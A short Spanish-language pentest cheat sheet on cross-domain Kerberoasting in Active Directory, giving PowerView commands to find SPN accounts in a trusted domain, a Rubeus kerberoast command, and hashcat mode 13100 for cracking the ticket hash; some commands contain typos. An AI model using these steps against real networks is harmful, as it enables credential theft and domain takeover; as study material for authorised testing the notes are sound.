#AD #SPN #KERBEROASTING

>Esta vulnerabilidad se puede explotar cuando llegas a un dominio, y no puedes escalar mas para arriba, y hay mas dominios con confianzas
# Enumeración de cuentas SPN asociadas entre dominios
Utilizaremos la herramienta [[00.- Herramientas/POWERVIEW]] usando `Get-DomainUser`

```shell
Get-DomainUser -SPN -Domain <dominio.objetivo> | slect samacountname
```

Nos devolverá una cuenta que este asociada con el otro dominio
# Enumeración de la cuenta encontrada
Para enumerar esta cuenta usaremos de nuevo [[00.- Herramientas/POWERVIEW]]

```shell
Get-DomainUser -Domain <dominio.objetivo> -Identity <user> | slect samacountname,memberof
```

Si por ejemplo en la salida pone que pertenece al grupo de `Doamin Admins` del otro dominio podemos hacer un ataque de `Kerberoasting`

# KERBEROASTING -> RUBEUS 
En la maquina a la que tenemos acceso nos pasaremos la herramienta de [[00.- Herramientas/RUBEUS]] y lo ejecutaremos

```shell
rubeus kerberoast /domain:<dominio.principal> /user:<user> /nowrap
```

El hash obtenido se lo pasaremos a [[HASHCAT]] con la opción `-m 13100`